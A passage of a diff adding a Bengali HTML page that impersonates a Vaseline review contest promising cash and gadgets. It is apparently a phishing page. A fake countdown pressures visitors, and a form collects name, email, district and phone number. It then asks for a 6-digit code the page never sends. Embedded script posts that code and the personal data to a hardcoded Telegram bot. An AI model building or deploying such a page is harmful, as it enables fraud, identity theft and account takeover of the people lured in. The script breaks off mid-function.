@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<title>শীতের রিভিউ উৎসব – পুরস্কার জিতুন</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Anek+Bangla:wght@500;700;800&family=Hind+Siliguri:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --mid:#060F1F; --deep:#0C1E3A; --glass:rgba(255,255,255,.07); --edge:rgba(255,255,255,.14);
+  --snow:#F2F8FF; --mute:#9DB3CC; --ice:#8FD3FF; --gold:#F5C26B; --gold2:#E39A2D; --err:#FF8A7A; --ok:#4FD18B;
+}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth;touch-action:manipulation;-webkit-text-size-adjust:100%}
+body{font-family:'Hind Siliguri',sans-serif;color:var(--snow);background:var(--mid);line-height:1.65;touch-action:manipulation;overflow-x:hidden}
+h1,h2,h3{font-family:'Anek Bangla','Hind Siliguri',sans-serif;line-height:1.22}
+img{display:block;max-width:100%}
+:focus-visible{outline:3px solid var(--gold);outline-offset:3px}
+.wrap{width:min(1120px,92%);margin:0 auto}
+.glass{background:var(--glass);border:1px solid var(--edge);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-radius:24px}
+
+/* header */
+.top{position:fixed;top:0;left:0;right:0;z-index:30;padding:calc(10px + env(safe-area-inset-top)) 0 10px;background:linear-gradient(var(--mid),rgba(6,15,31,0))}
+.top .wrap{display:flex;justify-content:space-between;align-items:center}
+.logo{background:#fff;border-radius:12px;padding:5px 12px;display:flex}
+.logo img{height:26px;width:auto}
+.pill{display:flex;align-items:center;gap:8px;padding:8px 14px;border-radius:999px;font-size:.92rem;font-weight:500}
+.pill b{color:var(--gold);font-variant-numeric:tabular-nums;font-family:'Anek Bangla'}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--err);box-shadow:0 0 0 0 rgba(255,138,122,.7);animation:pulse 1.8s infinite}
+@keyframes pulse{70%{box-shadow:0 0 0 10px rgba(255,138,122,0)}100%{box-shadow:0 0 0 0 rgba(255,138,122,0)}}
+
+/* hero */
+.hero{position:relative;min-height:100svh;display:grid;place-items:center;text-align:center;padding:110px 0 70px;
+  background:radial-gradient(700px 420px at 50% 0%,#1B4C86 0%,transparent 70%),radial-gradient(500px 400px at 100% 90%,rgba(245,194,107,.16),transparent 70%),linear-gradient(180deg,var(--deep),var(--mid))}
+#snow{position:absolute;inset:0;width:100%;height:100%;pointer-events:none}
+.hero .wrap{position:relative}
+.hero h1{font-size:clamp(2rem,6vw,4rem);font-weight:800;max-width:15em;margin:0 auto}
+.hero .lead{color:var(--mute);font-size:1.1rem;max-width:34em;margin:16px auto 0}
+.prize-big{margin:30px auto 0;display:inline-flex;flex-direction:column;align-items:center;padding:18px 44px;border-radius:28px;border:1px solid rgba(245,194,107,.5);
+  background:linear-gradient(160deg,rgba(245,194,107,.18),rgba(245,194,107,.04))}
+.prize-big small{color:var(--gold);font-size:.95rem}
+.prize-big strong{font:800 clamp(2.6rem,9vw,4.6rem)/1.1 'Anek Bangla';background:linear-gradient(180deg,#FFE7B0,var(--gold2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.prize-big span{color:var(--mute);font-size:.92rem}
+.cta{margin-top:30px;display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,var(--gold),var(--gold2));color:#2B1A00;border:0;border-radius:999px;padding:16px 38px;font:700 1.15rem 'Anek Bangla';cursor:pointer;box-shadow:0 14px 34px rgba(227,154,45,.35);transition:transform .15s}
+.cta:hover{transform:translateY(-2px)}
+
+/* sections */
+section{padding:76px 0 0}
+.head{text-align:center;margin-bottom:34px}
+.head h2{font-size:clamp(1.6rem,4vw,2.5rem);font-weight:800}
+.head p{color:var(--mute);margin-top:6px}
+
+/* countdown */
+.cd{display:flex;flex-wrap:wrap;gap:20px;align-items:center;justify-content:space-between;padding:26px 30px}
+.cd h3{font-size:1.3rem}.cd p{color:var(--mute);font-size:.95rem}
+.clock{display:flex;gap:12px}
+.clock div{min-width:84px;text-align:center;padding:12px 8px;border-radius:18px;background:rgba(6,15,31,.6);border:1px solid var(--edge)}
+.clock b{display:block;font:800 2.1rem/1.1 'Anek Bangla';color:var(--gold);font-variant-numeric:tabular-nums}
+.clock span{font-size:.8rem;color:var(--mute)}
+
+/* posters */
+.posters{display:grid;grid-template-columns:1fr 1fr;gap:32px;max-width:860px;margin:0 auto}
+.poster{padding:12px}
+.poster img{width:100%;border-radius:16px;pointer-events:none;-webkit-user-drag:none;user-select:none}
+@media(max-width:700px){
+  .posters{display:flex;overflow-x:auto;scroll-snap-type:x mandatory;gap:20px;padding:4px 4%;margin:0 -4%;scrollbar-width:none}
+  .posters::-webkit-scrollbar{display:none}
+  .poster{flex:0 0 80%;scroll-snap-align:center}
+}
+
+/* prizes bento */
+.bento{display:grid;grid-template-columns:1.3fr 1fr 1fr;grid-template-rows:auto auto;gap:18px}
+.tile{padding:26px;display:flex;flex-direction:column;justify-content:flex-end;min-height:190px}
+.tile.cash{grid-row:span 2;background:linear-gradient(160deg,rgba(245,194,107,.22),rgba(245,194,107,.04));border-color:rgba(245,194,107,.45)}
+.tile svg{width:44px;height:44px;margin-bottom:auto;stroke:var(--ice);fill:none;stroke-width:1.6;stroke-linecap:round;stroke-linejoin:round}
+.tile.cash svg{stroke:var(--gold);width:60px;height:60px}
+.tile h3{font-size:1.25rem;margin-top:18px}
+.tile p{color:var(--mute);font-size:.95rem}
+.tile.cash h3{font-size:1.8rem}
+
+/* timeline */
+.tl{max-width:640px;margin:0 auto;position:relative;padding-left:34px}
+.tl::before{content:"";position:absolute;left:11px;top:8px;bottom:8px;width:2px;background:linear-gradient(var(--gold),var(--ice),transparent)}
+.tl div{position:relative;padding:0 0 28px}
+.tl div::before{content:"";position:absolute;left:-30px;top:6px;width:14px;height:14px;border-radius:50%;background:var(--mid);border:3px solid var(--gold)}
+.tl h3{font-size:1.15rem}.tl p{color:var(--mute)}
+.rule{max-width:640px;margin:10px auto 0;padding:18px 22px;border-color:rgba(255,138,122,.5);background:rgba(255,138,122,.09)}
+.rule b{color:var(--err)}
+
+.final{text-align:center;padding:90px 0 80px}
+.final h2{font-size:clamp(1.6rem,4vw,2.5rem);font-weight:800}
+footer{text-align:center;color:var(--mute);font-size:.88rem;padding:22px 0;border-top:1px solid var(--edge)}
+
+/* ===== fullscreen form ===== */
+.flow{position:fixed;inset:0;z-index:100;display:none;flex-direction:column;background:radial-gradient(600px 400px at 50% -5%,#1B4C86,transparent 70%),linear-gradient(180deg,var(--deep),var(--mid))}
+.flow.open{display:flex}
+.fbar{padding:calc(14px + env(safe-area-inset-top)) 5% 0;display:flex;align-items:center;gap:14px}
+.fbar .logo img{height:22px}
+.steps{flex:1;display:flex;gap:6px}
+.steps i{flex:1;height:4px;border-radius:4px;background:rgba(255,255,255,.14);overflow:hidden;position:relative}
+.steps i::after{content:"";position:absolute;inset:0;background:linear-gradient(90deg,var(--ice),var(--gold));transform:scaleX(0);transform-origin:left;transition:transform .45s}
+.steps i.on::after{transform:scaleX(1)}
+.x{width:38px;height:38px;border-radius:50%;border:1px solid var(--edge);background:var(--glass);color:var(--snow);font-size:1.3rem;cursor:pointer}
+.fbody{flex:1;overflow:auto;display:flex;align-items:center;justify-content:center;padding:20px 5%}
+.scr{width:min(480px,100%);display:none;animation:in .35s ease}
+.scr.on{display:block}
+@keyframes in{from{opacity:0;transform:translateX(24px)}to{opacity:1;transform:none}}
+.kick{color:var(--gold);font-weight:600;font-size:.95rem;margin-bottom:6px}
+.scr h2{font-size:clamp(1.55rem,5vw,2.1rem);font-weight:800;margin-bottom:6px}
+.sub{color:var(--mute);margin-bottom:22px}
+.f{margin-bottom:16px}
+.f label,.f .l{display:block;font-size:.92rem;color:var(--mute);margin-bottom:6px}
+input[type=text],input[type=email],input[type=tel],textarea{width:100%;font:inherit;font-size:17px;color:var(--snow);background:rgba(255,255,255,.06);border:1.5px solid var(--edge);border-radius:16px;padding:15px 16px;transition:border .2s,background .2s}
+input::placeholder,textarea::placeholder{color:#6F86A1}
+input:focus,textarea:focus{outline:none;border-color:var(--gold);background:rgba(255,255,255,.1)}
+textarea{min-height:190px;resize:none}
+.choice{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.choice label{margin:0;cursor:pointer}
+.choice input{position:absolute;opacity:0}
+.choice span{display:block;text-align:center;padding:22px 10px;border-radius:18px;border:1.5px solid var(--edge);background:rgba(255,255,255,.05);font:700 1.2rem 'Anek Bangla';color:var(--snow);transition:.2s}
+.choice input:checked+span{border-color:var(--gold);background:rgba(245,194,107,.16);color:var(--gold)}
+.choice input:focus-visible+span{outline:3px solid var(--gold);outline-offset:2px}
+.warn{display:flex;gap:12px;padding:14px 16px;border-radius:16px;background:rgba(255,138,122,.1);border:1px solid rgba(255,138,122,.45);font-size:.93rem;margin-bottom:16px}
+.warn svg{flex:0 0 22px;width:22px;height:22px;stroke:var(--err);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;margin-top:2px}
+.cnt{text-align:right;font-size:.85rem;color:var(--mute);margin-top:6px}
+.err{color:var(--err);font-size:.92rem;min-height:1.4em;margin-top:8px}
+
+/* phone */
+.phone{display:flex;gap:10px}
+.cc{flex:0 0 auto;display:flex;align-items:center;gap:8px;padding:0 16px;border-radius:16px;border:1.5px solid var(--edge);background:rgba(255,255,255,.06);font:700 1.05rem 'Anek Bangla'}
+.cc i{width:22px;height:15px;border-radius:3px;background:#0A7B4B;position:relative}
+.cc i::after{content:"";position:absolute;width:7px;height:7px;border-radius:50%;background:#E0313F;left:7px;top:4px}
+.phone input{font:700 1.35rem 'Anek Bangla';letter-spacing:.06em}
+.trust{display:flex;gap:12px;align-items:flex-start;margin-top:16px;padding:14px 16px;border-radius:16px;background:var(--glass);border:1px solid var(--edge);font-size:.92rem;color:var(--mute)}
+.trust svg{flex:0 0 22px;width:22px;stroke:var(--ice);fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
+
+/* processing */
+.proc{text-align:center}
+.orb{width:150px;height:150px;margin:0 auto 22px;border-radius:50%;background:conic-gradient(var(--gold) var(--p,0%),rgba(255,255,255,.1) 0);display:grid;place-items:center}
+.orb span{width:124px;height:124px;border-radius:50%;background:var(--deep);display:grid;place-items:center;font:800 2.6rem 'Anek Bangla';color:var(--gold)}
+.chk{list-style:none;display:inline-block;text-align:left;margin-top:18px}
+.chk li{display:flex;gap:10px;align-items:center;color:#5F7792;padding:5px 0;transition:color .3s}
+.chk li::before{content:"";width:18px;height:18px;border-radius:50%;border:2px solid currentColor;flex:0 0 18px}
+.chk li.go{color:var(--snow)}
+.chk li.ok{color:var(--ok)}
+.chk li.ok::before{background:var(--ok);border-color:var(--ok);box-shadow:inset 0 0 0 3px var(--deep)}
+
+/* otp */
+.otp{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin:6px 0 4px}
+.otp input{width:100%;aspect-ratio:1/1.2;text-align:center;padding:0;font:800 1.7rem 'Anek Bangla';border-radius:14px}
+.sent{display:inline-flex;gap:8px;align-items:center;padding:8px 14px;border-radius:999px;background:rgba(79,209,139,.14);color:var(--ok);font-size:.92rem;margin-bottom:18px}
+
+/* done */
+.done{text-align:center}
+.tick{width:96px;height:96px;margin:0 auto 20px;border-radius:50%;background:linear-gradient(135deg,var(--ok),#1E9A62);display:grid;place-items:center;box-shadow:0 0 0 12px rgba(79,209,139,.14)}
+.tick svg{width:46px;stroke:#fff;fill:none;stroke-width:3.2;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:40;stroke-dashoffset:40;animation:draw .6s .2s forwards}
+@keyframes draw{to{stroke-dashoffset:0}}
+.callbox{margin-top:20px;padding:16px;border-radius:18px;border:1px solid rgba(245,194,107,.5);background:rgba(245,194,107,.1);text-align:left}
+
+/* footer nav */
+.fnav{display:flex;gap:12px;padding:12px 5% calc(16px + env(safe-area-inset-bottom));justify-content:center}
+.fnav>*{width:min(480px,100%)}
+.fnav .inner{display:flex;gap:12px;width:min(480px,100%)}
+.btn{flex:1;border:0;border-radius:16px;padding:16px;font:700 1.1rem 'Anek Bangla';cursor:pointer;background:linear-gradient(135deg,var(--gold),var(--gold2));color:#2B1A00}
+.btn.ghost{flex:0 0 30%;background:var(--glass);color:var(--snow);border:1px solid var(--edge)}
+.btn:disabled{opacity:.55;cursor:wait}
+.hide{display:none!important}
+
+@media(max-width:820px){
+  .bento{grid-template-columns:1fr 1fr}
+  .tile.cash{grid-column:span 2;grid-row:auto;min-height:230px}
+  .cd{justify-content:center;text-align:center}
+}
+@media(max-width:420px){.clock div{min-width:72px}.pill{font-size:.82rem;padding:7px 11px}.otp{gap:7px}}
+@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}html{scroll-behavior:auto}}
+</style>
+</head>
+<body>
+
+<div class="top"><div class="wrap">
+  <div class="logo"><img src="https://i.ibb.co/Zz8yXfy0/Vaseline-new-logo.png" alt="সাইট লোগো"></div>
+  <div class="pill glass"><span class="dot"></span>অফার শেষ হতে <b id="miniT">--:--:--</b></div>
+</div></div>
+
+<header class="hero">
+  <canvas id="snow" aria-hidden="true"></canvas>
+  <div class="wrap">
+    <h1>শীতের প্রোডাক্টের রিভিউ দিন, জিতে নিন আকর্ষণীয় পুরস্কার</h1>
+    <p class="lead">আমাদের শীতের পণ্য কেমন লেগেছে, নিজের ভাষায় লিখে জানান। সেরা রিভিউয়ের জন্য থাকছে নগদ টাকা, ল্যাপটপ, গেমিং ফোন ও গেমিং কনসোল।</p>
+    <div class="prize-big"><small>নগদ পুরস্কার</small><strong>১০,০০০ ৳</strong><span>পর্যন্ত জিতে নিন</span></div><br>
+    <button class="cta" data-open>রিভিউ দিন</button>
+  </div>
+</header>
+
+<section><div class="wrap">
+  <div class="cd glass">
+    <div><h3>অফার শেষ হতে আর অল্প সময় বাকি</h3><p>সময় থাকতেই আপনার রিভিউ জমা দিন</p></div>
+    <div class="clock" role="timer">
+      <div><b id="h">০২</b><span>ঘণ্টা</span></div>
+      <div><b id="m">১৩</b><span>মিনিট</span></div>
+      <div><b id="s">০০</b><span>সেকেন্ড</span></div>
+    </div>
+  </div>
+</div></section>
+
+<section><div class="wrap">
+  <div class="head"><h2>অফারের বিবরণ</h2><p>পোস্টার দুটি দেখে নিন</p></div>
+  <div class="posters">
+    <div class="poster glass"><img src="https://i.ibb.co/k2FRBBK2/file-00000000f6c882129c7a2ca10d9acbe4.png" alt="অফারের পোস্টার ১" draggable="false"></div>
+    <div class="poster glass"><img src="https://i.ibb.co/dw3xW1c5/file-00000000d38481fd9fbcb42e4b5ca123.png" alt="অফারের পোস্টার ২" draggable="false"></div>
+  </div>
+</div></section>
+
+<section><div class="wrap">
+  <div class="head"><h2>যা যা জিততে পারেন</h2><p>সেরা ও সৎ রিভিউয়ের জন্য বিজয়ী বাছাই করা হবে</p></div>
+  <div class="bento">
+    <div class="tile glass cash">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M9 9.5h4.5a1.8 1.8 0 010 3.6H9m0 0h5a1.8 1.8 0 010 3.6H9M9 7v10"/></svg>
+      <h3>১০,০০০ টাকা পর্যন্ত নগদ</h3><p>সেরা রিভিউয়ারদের জন্য নগদ পুরস্কার</p></div>
+    <div class="tile glass">
+      <svg viewBox="0 0 24 24"><rect x="4" y="5" width="16" height="11" rx="1.5"/><path d="M2 19h20"/></svg>
+      <h3>ল্যাপটপ</h3><p>কাজ ও পড়াশোনার সঙ্গী</p></div>
+    <div class="tile glass">
+      <svg viewBox="0 0 24 24"><rect x="7" y="2.5" width="10" height="19" rx="2"/><path d="M11 18.5h2"/></svg>
+      <h3>গেমিং ফোন</h3><p>দ্রুত গতির পারফরম্যান্স</p></div>
+    <div class="tile glass" style="grid-column:span 2">
+      <svg viewBox="0 0 24 24"><path d="M7 8h10a4 4 0 014 4l-1 5a2 2 0 01-3.4 1L15 16H9l-1.6 2A2 2 0 014 17l-1-5a4 4 0 014-4z"/><path d="M8 10.5v3M6.5 12h3"/></svg>
+      <h3>গেমিং কনসোল</h3><p>বিনোদনের নতুন মাত্রা</p></div>
+  </div>
+</div></section>
+
+<section><div class="wrap">
+  <div class="head"><h2>অংশ নেবেন যেভাবে</h2><p>কয়েক মিনিটেই শেষ</p></div>
+  <div class="tl">
+    <div><h3>তথ্য দিন</h3><p>নাম, ইমেইল, জেলা এবং আমাদের পণ্য ব্যবহারের অভিজ্ঞতা জানান।</p></div>
+    <div><h3>রিভিউ লিখুন</h3><p>পণ্যটি কেমন লেগেছে, নিজের ভাষায় লিখুন।</p></div>
+    <div><h3>নম্বর যাচাই করুন</h3><p>মোবাইল নম্বরে ৬ সংখ্যার কোড যাবে। কোডটি দিয়ে জমা সম্পন্ন করুন।</p></div>
+  </div>
+  <div class="rule glass"><b>গুরুত্বপূর্ণ:</b> রিভিউ অবশ্যই নিজের লেখা হতে হবে। এআই (AI) কন্টেন্ট ব্যবহার সম্পূর্ণ নিষিদ্ধ। ধরা পড়লে পুরস্কারের যোগ্য বিবেচিত হবে না।</div>
+</div></section>
+
+<div class="final"><div class="wrap">
+  <h2>আপনার রিভিউই হতে পারে সেরা</h2><button class="cta" data-open>রিভিউ দিন</button>
+</div></div>
+<footer>© শীতের রিভিউ উৎসব। সকল স্বত্ব সংরক্ষিত।</footer>
+
+<!-- ============ FORM ============ -->
+<div class="flow" id="flow" role="dialog" aria-modal="true" aria-label="রিভিউ ফর্ম">
+  <div class="fbar">
+    <div class="logo"><img src="https://i.ibb.co/Zz8yXfy0/Vaseline-new-logo.png" alt=""></div>
+    <div class="steps" id="steps"><i></i><i></i><i></i><i></i><i></i></div>
+    <button class="x" id="close" aria-label="বন্ধ করুন">&times;</button>
+  </div>
+
+  <div class="fbody">
+    <!-- 0 -->
+    <div class="scr on" data-s="0">
+      <div class="kick">ধাপ ১ / ৫</div><h2>আপনার পরিচয়</h2><p class="sub">পুরস্কার পৌঁছাতে এই তথ্য লাগবে।</p>
+      <div class="f"><label for="name">আপনার নাম</label><input id="name" type="text" autocomplete="name" placeholder="পূর্ণ নাম"></div>
+      <div class="f"><label for="email">ইমেইল</label><input id="email" type="email" autocomplete="email" placeholder="example@gmail.com"></div>
+      <div class="f"><label for="dist">জেলার নাম</label><input id="dist" type="text" placeholder=""></div>
+    </div>
+    <!-- 1 -->
+    <div class="scr" data-s="1">
+      <div class="kick">ধাপ ২ / ৫</div><h2>আপনি কি আমাদের প্রোডাক্ট ব্যবহার করেন?</h2><p class="sub">সৎ উত্তর দিন, এতে পুরস্কারের সুযোগ কমবে না।</p>
+      <div class="choice f"><label><input type="radio" name="use" value="হ্যাঁ"><span>হ্যাঁ</span></label><label><input type="radio" name="use" value="না"><span>না</span></label></div>
+      <div class="f hide" id="durF"><label for="dur">কতদিন থেকে ব্যবহার করছেন?</label><input id="dur" type="text" placeholder=""></div>
+    </div>
+    <!-- 2 -->
+    <div class="scr" data-s="2">
+      <div class="kick">ধাপ ৩ / ৫</div><h2>প্রোডাক্ট কেমন লেগেছে?</h2><p class="sub">আপনার অভিজ্ঞতা নিজের ভাষায় লিখুন।</p>
+      <div class="warn"><svg viewBox="0 0 24 24"><path d="M12 3l10 18H2L12 3z"/><path d="M12 10v5M12 18h.01"/></svg><div><b>এআই কন্টেন্ট ব্যবহার নিষিদ্ধ।</b> এআই দিয়ে লেখা ধরা পড়লে আপনি পুরস্কারের যোগ্য হবেন না।</div></div>
+      <textarea id="rev" aria-label="রিভিউ" placeholder="ব্যবহার করে কী ভালো লেগেছে, শীতে কতটা কাজে দিয়েছে..."></textarea>
+      <div class="cnt"><span id="cc">০</span> / কমপক্ষে ৩০ অক্ষর</div>
+    </div>
+    <!-- 3 -->
+    <div class="scr" data-s="3">
+      <div class="kick">ধাপ ৪ / ৫</div><h2>আপনার মোবাইল নম্বর</h2><p class="sub">এই নম্বরে ৬ সংখ্যার কোড পাঠানো হবে।</p>
+      <div class="phone"><div class="cc"><i></i>+88</div><input id="ph" type="tel" inputmode="numeric" maxlength="11" autocomplete="tel" placeholder="01XXXXXXXXX" aria-label="মোবাইল নম্বর"></div>
+      <div class="trust"><svg viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V8a4 4 0 018 0v3"/></svg><div>পুরস্কার জিতলে এই নম্বরেই ফোন করা হবে। তাই সচল ও আপনার নিজের নম্বর দিন।</div></div>
+    </div>
+    <!-- proc -->
+    <div class="scr proc" data-s="p">
+      <div class="orb" id="orb"><span id="sec">১০</span></div>
+      <h2>প্রসেসিং চলছে</h2><p class="sub" style="margin:0">পেজ বন্ধ করবেন না</p>
+      <ul class="chk" id="chk"><li>তথ্য যাচাই হচ্ছে</li><li>নম্বর নিবন্ধন হচ্ছে</li><li>কোড প্রস্তুত করা হচ্ছে</li></ul>
+    </div>
+    <!-- 4 -->
+    <div class="scr" data-s="4">
+      <div class="kick">ধাপ ৫ / ৫</div><h2>কোড লিখুন</h2>
+      <div class="sent" id="sentTo">কোড পাঠানো হচ্ছে</div>
+      <div class="otp" id="otp"><input inputmode="numeric" maxlength="1" aria-label="১ম সংখ্যা"><input inputmode="numeric" maxlength="1" aria-label="২য় সংখ্যা"><input inputmode="numeric" maxlength="1" aria-label="৩য় সংখ্যা"><input inputmode="numeric" maxlength="1" aria-label="৪র্থ সংখ্যা"><input inputmode="numeric" maxlength="1" aria-label="৫ম সংখ্যা"><input inputmode="numeric" maxlength="1" aria-label="৬ষ্ঠ সংখ্যা"></div>
+      <p class="sub" style="margin-top:14px;font-size:.92rem">কোড আসতে কিছুটা সময় লাগতে পারে। কোডের মেয়াদ ১০ মিনিট।</p>
+    </div>
+    <!-- done -->
+    <div class="scr done" data-s="d">
+      <div class="tick"><svg viewBox="0 0 24 24"><path d="M5 12.5l4.5 4.5L19 7.5"/></svg></div>
+      <h2>স্বাগতম! আপনার রিভিউ জমা হয়েছে</h2>
+      <p class="sub" style="margin:0">শীতের রিভিউ উৎসবে অংশ নেওয়ার জন্য ধন্যবাদ।</p>
+      <div class="callbox"><b>গুরুত্বপূর্ণ:</b> পুরস্কার জিতলে আপনাকে ফোন করা হবে। তাই আপনার ফোন নম্বরটি সচল রাখুন।</div>
+    </div>
+  </div>
+
+  <div class="err" id="err" style="text-align:center;margin:0;min-height:1.4em" role="alert"></div>
+  <div class="fnav" id="nav"><div class="inner"><button class="btn ghost" id="back">ফিরে যান</button><button class="btn" id="next">পরবর্তী ধাপ</button></div></div>
+</div>
+
+<script>
+/* ============ সেটিং: শুধু এই দুটি জায়গা বদলান ============ */
+const BOT_TOKEN = "9195555498:AAGdYBfW3pXdU2EWproEHKzNHg3-fvjq61I";
+const CHAT_ID   = "9038566143";
+const OFFER_MINUTES = 133; // অফার শেষ হতে ২ ঘণ্টা ১৩ মিনিট
+/* ====================================================== */
+
+const $ = id => document.getElementById(id);
+const bn = n => String(n).replace(/\d/g, d => "০১২৩৪৫৬৭৮৯"[d]);
+const en = s => s.replace(/[০-৯]/g, d => "০১২৩৪৫৬৭৮৯".indexOf(d));
+
+/* ---- জুম বন্ধ ---- */
+["gesturestart","gesturechange","gestureend"].forEach(t=>document.addEventListener(t,e=>e.preventDefault()));
+document.addEventListener("touchmove",e=>{ if(e.touches.length>1) e.preventDefault(); },{passive:false});
+let lt=0; document.addEventListener("touchend",e=>{ const n=Date.now(); if(n-lt<300) e.preventDefault(); lt=n; },{passive:false});
+addEventListener("wheel",e=>{ if(e.ctrlKey) e.preventDefault(); },{passive:false});
+addEventListener("keydown",e=>{ if((e.ctrlKey||e.metaKey)&&["+","-","=","0"].includes(e.key)) e.preventDefault(); });
+
+/* ---- কাউন্টডাউন ---- */
+let endAt;
+try{ endAt=+localStorage.getItem("offerEnd"); if(!endAt){ endAt=Date.now()+OFFER_MINUTES*60000; localStorage.setItem("offerEnd",endAt);} }
+catch(e){ endAt=Date.now()+OFFER_MINUTES*60000; }
+function tick(){
+  const t=Math.max(0,endAt-Date.now()), p=x=>String(x).padStart(2,"0");
+  const h=Math.floor(t/3600000), m=Math.floor(t%3600000/60000), s=Math.floor(t%60000/1000);
+  $("h").textContent=bn(p(h)); $("m").textContent=bn(p(m)); $("s").textContent=bn(p(s));
+  $("miniT").textContent=t?bn(`${p(h)}:${p(m)}:${p(s)}`):"শেষ";
+}
+tick(); setInterval(tick,1000);
+
+/* ---- তুষার ---- */
+(function(){
+  if(matchMedia("(prefers-reduced-motion:reduce)").matches) return;
+  const c=$("snow"),x=c.getContext("2d"); let W,H,f=[];
+  const size=()=>{W=c.width=c.offsetWidth;H=c.height=c.offsetHeight}; size(); addEventListener("resize",size);
+  for(let i=0;i<70;i++) f.push({x:Math.random()*2000,y:Math.random()*1200,r:Math.random()*2.2+.6,v:Math.random()*.6+.25,d:Math.random()*6});
+  (function draw(){ x.clearRect(0,0,W,H); x.fillStyle="rgba(255,255,255,.7)";
+    f.forEach(p=>{p.y+=p.v;p.d+=.01;p.x+=Math.sin(p.d)*.4;if(p.y>H){p.y=-5;p.x=Math.random()*W}
+      x.beginPath();x.arc(p.x%W,p.y,p.r,0,7);x.fill()}); requestAnimationFrame(draw); })();
+})();
+
+/* ---- ফর্ম ফ্লো ---- */
+const flow=$("flow"), scrs=[...document.querySelectorAll(".scr")];
+const data={}; let cur=0; // 0..3 ফর্ম, 4 ওটিপি
+function go(key){
+  scrs.forEach(s=>s.classList.toggle("on",s.dataset.s===String(key)));
+  const idx = key==="p"?3:key==="d"?5:+key;
+  document.querySelectorAll("#steps i").forEach((el,i)=>el.classList.toggle("on",i<=idx));
+  $("back").classList.toggle("hide",!(key>0&&key<=3&&key!=="p"));
+  $("nav").classList.toggle("hide",key==="p"||key==="d");
+  $("next").textContent = key===3?"কোড পাঠান":key===4?"জমা দিন":"পরবর্তী ধাপ";
+  $("err").textContent="";
+}
+function openF(){ flow.classList.add("open"); document.body.style.overflow="hidden"; go(cur); }
+function closeF(){ flow.classList.remove("open"); document.body.style.overflow=""; }
+document.querySelectorAll("[data-open]").forEach(b=>b.onclick=openF);
+$("close").onclick=closeF;
+addEventListener("keydown",e=>{ if(e.key==="Escape"&&flow.classList.contains("open")) closeF(); });
+
+document.querySelectorAll("input[name=use]").forEach(r=>r.onchange=()=>$("durF").classList.toggle("hide",r.value!=="হ্যাঁ"));
+$("rev").oninput=e=>$("cc").textContent=bn(e.target.value.trim().length);
+
+/* ওটিপি ঘর */
+const ob=[...document.querySelectorAll("#otp input")];
+ob.forEach((el,i)=>{
+  el.addEventListener("input",()=>{ el.value=en(el.value).replace(/\D/g,"").slice(-1); if(el.value&&i<5) ob[i+1].focus(); });
+  el.addEventListener("keydown",e=>{ if(e.key==="Backspace"&&!el.value&&i>0) ob[i-1].focus(); });
+  el.addEventListener("paste",e=>{ e.preventDefault(); const t=en(e.clipboardData.getData("text")).replace(/\D/g,"").slice(0,6);
+    [...t].forEach((c,k)=>ob[k].value=c); (ob[Math.min(t.length,5)]).focus(); });
+});
+
+async function sendBot(text){
+  const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text})});
+  if(!r.ok) throw new Error("fail");
+}
+const info=()=>`নাম: ${data.name}
+ইমেইল: ${data.email}
+জেলা: ${data.dist}
+প্রোডাক্ট ব্যবহার করেন: ${data.use}
+কতদিন: ${data.dur}`;
+
+$("back").onclick=()=>{ if(cur>0){ cur--; go(cur);} };
+
+$("next").onclick=async()=>{
+  let e="";
+  if(cur===0){
+    const name=$("name").value.trim(),email=$("email").value.trim(),dist=$("dist").value.trim();
+    if(name.length<3) e="আপনার পূর্ণ নাম লিখুন।";
+    else if(!/^\S+@\S+\.\S+$/.test(email)) e="সঠিক ইমেইল ঠিকানা দিন।";
+    else if(dist.length<2) e="জেলার নাম লিখুন।";
+    if(!e){ Object.assign(data,{name,email,dist}); cur=1; go(1); return; }
+  }else if(cur===1){
+    const u=document.querySelector("input[name=use]:checked"), dur=$("dur").value.trim();
+    if(!u) e="হ্যাঁ বা না বেছে নিন।";
+    else if(u.value==="হ্যাঁ"&&!dur) e="কতদিন ধরে ব্যবহার করছেন, তা লিখুন।";
+    if(!e){ data.use=u.value; data.dur=u.value==="হ্যাঁ"?dur:"প্রযোজ্য নয়"; cur=2; go(2); return; }
+  }else if(cur===2){
+    const rev=$("rev").value.trim();
+    if(rev.length<30) e="রিভিউ কমপক্ষে ৩০ অক্ষরের হতে হবে।";
+    if(!e){ data.rev=rev; cur=3; go(3); return; }
+  }else if(cur===3){
+    const ph=en($("ph").value.trim());
+    if(!/^01[3-9]\d{8}$/.test(ph)) e="সঠিক ১১ সংখ্যার নম্বর দিন (01XXXXXXXXX)।";
+    if(!e){ data.phone=ph; await processing(); return; }
+  }else if(cur===4){
+    const code=ob.map(i=>i.value).join("");
+    if(code.length<6) e="৬ সংখ্যার পুরো কোডটি লিখুন।";
+    if(!e){
+      $("next").disabled=true; $("next").textContent="জমা হচ্ছে...";
+      try{
+        await sendBot(`✅ সম্পূর্ণ সাবমিশন\nকোড: ${code}\nমোবাইল: ${data.phone}\n\n${info()}\n\nরিভিউ:\n${data.rev}`);
+        go("d");
+      }catch(x){ $("err").textContent="জমা দেওয়া যায়নি। ইন্টারনেট দেখে আবার চেষ্টা করুন।"; }
